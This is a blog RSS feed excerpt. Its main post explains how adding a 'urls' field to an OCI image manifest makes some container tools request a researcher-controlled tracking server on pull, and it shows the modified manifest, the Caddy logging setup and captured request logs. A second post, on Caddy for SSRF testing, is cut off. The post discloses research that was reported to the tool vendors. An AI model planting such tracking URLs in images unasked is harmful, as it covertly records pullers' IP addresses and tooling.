				<title>Fun with Containers - Adding tracking to your images</title>
				<description>&lt;p&gt;Last year I was taking a look at the OCI Image specification and I came across something kind of interesting, which is how you can get a container image to ping a URL when it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pulled&lt;/code&gt; to a host almost like a tracking cookie. Needless to say this isn’t me dropping 0-day, I reported this to the containerd and podman security addresses back in October 2022 and the consensus appears to be that whilst this may have some security implications it’s not dreadfully serious in most cases and it’s part of the spec, so unlikely to change.&lt;/p&gt;

&lt;p&gt;With that said, it’s an interesting way to investigate a bit about how the OCI spec works and some of the tooling that goes with it, so lets dive in.&lt;/p&gt;

&lt;h2 id=&quot;oci-image-specification&quot;&gt;OCI Image Specification&lt;/h2&gt;

&lt;p&gt;Reading through the &lt;a href=&quot;https://github.com/opencontainers/image-spec/blob/main/spec.md&quot;&gt;OCI Image Specification&lt;/a&gt; like any specification can be a bit hard to reason about as there’s a lot of text there, which you’d expect in a document which has to be precise about what it’s defining. So to help me parse out what was happening I tried to create a mermaid.js diagram of the different elements, which ended up looking like this :-&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/oci-image-spec.png&quot; alt=&quot;OCI Image Mermaid diagram&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the graph, I noticed that several of the sections, including config, manifest, and layers are of type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;descriptor&lt;/code&gt;. Looking at the &lt;a href=&quot;https://github.com/opencontainers/image-spec/blob/main/descriptor.md&quot;&gt;type definition&lt;/a&gt; I saw that there was a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urls&lt;/code&gt; field which is listed as OPTIONAL. Seeing this made me wonder, what happens if you specify that in a container image?&lt;/p&gt;

&lt;p&gt;At this point I had an experiment to try out, so the next step was to create an image that specifies a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter…&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-base-image&quot;&gt;Setting up the base image&lt;/h2&gt;

&lt;p&gt;The first thing to note here is a bit of container image history. Usually if you use &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; to create images you don’t actually get an OCI specification image, you get a docker format image. Whilst these are generally interoperable, there are som differences which matter for the purpose of this experiment, so we can’t just do what we might usually and use a docker image as a starting point.&lt;/p&gt;

&lt;p&gt;To demonstrate this I created a very simple Dockerfile&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; busybox&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; [&quot;/bin/sh&quot;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then built it first with standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker build&lt;/code&gt; and then with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker buildx build -o type=oci&lt;/code&gt; to get an OCI image. Extracting the tarballs for both these shows how the two formats differ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Docker image&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;383fca235ae5442f82b630fed2d6ed8306cc4f6f490e41f56c7fddbdf5f795be.json
5e558067e843bda80c685292e5fcc6d3a1c01cea5f13896cc891d70bc4067e07/
5e558067e843bda80c685292e5fcc6d3a1c01cea5f13896cc891d70bc4067e07/VERSION
5e558067e843bda80c685292e5fcc6d3a1c01cea5f13896cc891d70bc4067e07/json
5e558067e843bda80c685292e5fcc6d3a1c01cea5f13896cc891d70bc4067e07/layer.tar
manifest.json
repositories
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;OCI Image&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;blobs/
blobs/sha256/
blobs/sha256/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9
blobs/sha256/c5b5e79770f0f14d204f1bfdda52533a39b140eec9d39c15d165b41af3972feb
blobs/sha256/f5b7ce95afea5d39690afc4c206ee1bf3e3e956dcc8d1ccd05c6613a39c4e4f8
index.json
manifest.json
oci-layout
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we know how to create an OCI image to use we need to modify one of the sections to include our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter.&lt;/p&gt;

&lt;h2 id=&quot;modifying-the-image&quot;&gt;Modifying the image&lt;/h2&gt;

&lt;p&gt;One of the feature of OCI images is that they use SHA-256 hashes to identify the different elements, so if we modify the contents of a file, we then need to re-compute the hash of the file and update the references to it. What I found was that the easiest section to modify, which has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter set, is the manifest layer. So if we get the manifest from our OCI image above we can add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter to it like this&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;mediaType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.oci.image.manifest.v1+json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;schemaVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;config&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;mediaType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.oci.image.config.v1+json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;digest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sha256:245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;625&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;urls&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://logs.pwndland.uk/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;layers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;mediaType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.oci.image.layer.v1.tar+gzip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;digest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sha256:f5b7ce95afea5d39690afc4c206ee1bf3e3e956dcc8d1ccd05c6613a39c4e4f8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;772998&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ve added the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://logs.pwndland.uk/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config&lt;/code&gt; section of the manfiest. This URL includes the SHA-256 hash of the config file, which is important as it’s checked by the OCI runtime when it’s pulled (you can use different urls but you’ll get more errors and less successful pulls that way).&lt;/p&gt;

&lt;p&gt;When we add this change to the manifest we’ve modified the hash of the manifest file, so we need to update this anywhere it appears in the image to make things work. There’s a couple of steps here :-&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sha256sum&lt;/code&gt; on the modified manifest file to get the new hash&lt;/li&gt;
  &lt;li&gt;run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mv [old hash] [new hash]&lt;/code&gt; to rename the file&lt;/li&gt;
  &lt;li&gt;run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stat -c%s [new_manifest_hash_value]&lt;/code&gt; to get the size of the file&lt;/li&gt;
  &lt;li&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.json&lt;/code&gt; update the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manifests&lt;/code&gt; section to use the new hash and size&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At this point you should have a valid image, so now we just need to upload to a registry to test it.&lt;/p&gt;

&lt;h2 id=&quot;uploading-to-a-registry&quot;&gt;Uploading to a registry&lt;/h2&gt;

&lt;p&gt;The obvious way to do this might be to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar&lt;/code&gt; up the image and then use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker load&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker push&lt;/code&gt; to upload to a registry, however that doesn’t work as the process will modify the image and remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt; parameter. So we need to use a different method.&lt;/p&gt;

&lt;p&gt;The best tool I found for doing this without mangling our image, is &lt;a href=&quot;https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md&quot;&gt;crane&lt;/a&gt;. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crane push&lt;/code&gt; we can upload the directory to our registry without having to create a tarball first.&lt;/p&gt;

&lt;p&gt;In terms of which registries this will work with, I’ve tested Docker Hub, GitHub and Quay.io and they all work (it also works with harbor run locally).&lt;/p&gt;

&lt;h3 id=&quot;running-our-webserver&quot;&gt;Running our webserver&lt;/h3&gt;

&lt;p&gt;To receive the pings from our images being pulled, we need a webserver to receive them. I used Caddy for this as it works pretty well. You can see some general notes about using Caddy that I made &lt;a href=&quot;https://raesene.github.io/blog/2023/01/21/Fun-with-Caddy-SSRF-Testing/&quot;&gt;here&lt;/a&gt;. In this case our Caddyfile can be pretty simple as we just need it to serve files from a directory and log the requests to a file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-caddyfile&quot;&gt;logs.pwndland.uk:80 {
  root * /home/ubuntu/bad_images/hashes
  file_server
  log {
    output file bad_image_access_log.log
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;testing-it-out&quot;&gt;Testing it out&lt;/h3&gt;

&lt;p&gt;So now we have our modified image hosted in a registry, the question is…. does it work? The answer to this turned out to be a little bit varied depending on the tool used to pull the image.&lt;/p&gt;

&lt;p&gt;If we use Docker to pull the image, the pull works and we get no ping back to our webserver.&lt;/p&gt;

&lt;p&gt;If we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nercdctl&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;containerd&lt;/code&gt; we get something like this. You can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-agent&lt;/code&gt; header gives us some information about the tool used, you also get the source IP address that pulled it (I’ve redacted in this case as the test’s run from my home network :) )&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;level&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;info&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;ts&quot;&lt;/span&gt;:1676109995.5399737,&lt;span class=&quot;s2&quot;&gt;&quot;logger&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;http.log.access.log6&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;msg&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;handled request&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;request&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;remote_ip&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;[REDACTED]&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;remote_port&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;50758&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;proto&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1.1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;logs.pwndland.uk&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;uri&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;headers&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;containerd/1.6.0+unknown&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.oci.image.config.v1+json, */*&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;gzip&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;user_id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;duration&quot;&lt;/span&gt;:0.000304641,&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;:625,&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:200,&lt;span class=&quot;s2&quot;&gt;&quot;resp_headers&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Etag&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ro9zwzhd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;:[],&lt;span class=&quot;s2&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;Tue, 10 Jan 2023 15:19:47 GMT&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept-Ranges&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;bytes&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;625&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Server&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;Caddy&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pulling the image with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;podman&lt;/code&gt; will ping as well with a different user agent string showing a different library used for the interaction with registries.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;level&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;info&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;ts&quot;&lt;/span&gt;:1676109882.1299412,&lt;span class=&quot;s2&quot;&gt;&quot;logger&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;http.log.access.log6&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;msg&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;handled request&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;request&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;remote_ip&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;[REDACTED]&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;remote_port&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;38378&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;proto&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1.1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;logs.pwndland.uk&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;uri&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;headers&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;containers/5.16.0 (github.com/containers/image)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Docker-Distribution-Api-Version&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;registry/2.0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;gzip&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Connection&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;user_id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;duration&quot;&lt;/span&gt;:0.000237844,&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;:625,&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:200,&lt;span class=&quot;s2&quot;&gt;&quot;resp_headers&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;625&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Server&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;Caddy&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Etag&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ro9zwzhd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;:[],&lt;span class=&quot;s2&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;Tue, 10 Jan 2023 15:19:47 GMT&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept-Ranges&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;bytes&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Other tools which work with OCI images, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;skopeo&lt;/code&gt; will also trigger the ping, each with their own User-Agent.&lt;/p&gt;

&lt;h2 id=&quot;avoiding-this&quot;&gt;Avoiding this&lt;/h2&gt;

&lt;p&gt;If someone tracking your image pulls is a concern, then avoiding this is generally a matter of ensuring that you pull trusted images from trusted registries. If you’re using a public registry (e.g. Docker hub or ghcr) then you’re already disclosing your IP address and user agent to a third party…&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;As with the general tenor of my “fun with” series there’s no earth shattering payoff here, but I found this an interesting way to run through a specification and find possibly unintended behaviour. Also doing this helped me learn quite a bit about the OCI image specification and how it’s used.&lt;/p&gt;
</description>
				<pubDate>Sat, 11 Feb 2023 08:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/</guid>
			</item>
		
			<item>
				<title>Fun with Caddy - SSRF Testing</title>
				<description>&lt;p&gt;Recently I’ve been looking at &lt;a href=&quot;https://raesene.github.io/blog/2023/01/02/Fun-with-SSRF-Turning-the-Kubernetes-API-server-into-a-port-scanner/&quot;&gt;SSRF in Kubernetes&lt;/a&gt;. When testing for SSRF, I find it very useful to have a webserver/reverse proxy that I control and can configure to do a number of tasks. I’ve been using &lt;a href=&quot;https://caddyserver.com/&quot;&gt;Caddy&lt;/a&gt; for this. In this post I’ll show you how to use Caddy to test for SSRF.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-caddy&quot;&gt;Setting up Caddy&lt;/h2&gt;

&lt;p&gt;The first benefit I found, from a researcher/pentester standpoint was ease of installation. Caddy is written in Golang and, in common with most Golang utilities, runs as a single binary. Whilst there are more complex installation methods available you can just grab a binary from the &lt;a href=&quot;https://github.com/caddyserver/caddy/releases/tag/v2.6.2&quot;&gt;releases page&lt;/a&gt; extract the archive (checking signatures/checksums ofc!) and then run it.&lt;/p&gt;

&lt;h2 id=&quot;configuring-caddy&quot;&gt;Configuring Caddy&lt;/h2&gt;

&lt;p&gt;There’s two ways to configure Caddy, &lt;a href=&quot;https://caddyserver.com/docs/getting-started#json-vs-caddyfile&quot;&gt;JSON and Caddyfile&lt;/a&gt;. For the kind of simple examples I’m using for SSRF, Caddyfiles are generally a better option as the file is more readable.&lt;/p&gt;

&lt;p&gt;In the general case if you have a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Caddyfile&lt;/code&gt; in a directory, you can start the proxy with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caddy run&lt;/code&gt;. If you want to use a different file, you can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--config&lt;/code&gt; flag. For example, if you have a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myconfig&lt;/code&gt; in the current directory, you can start the proxy with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caddy run --config myconfig&lt;/code&gt;.&lt;/p&gt;

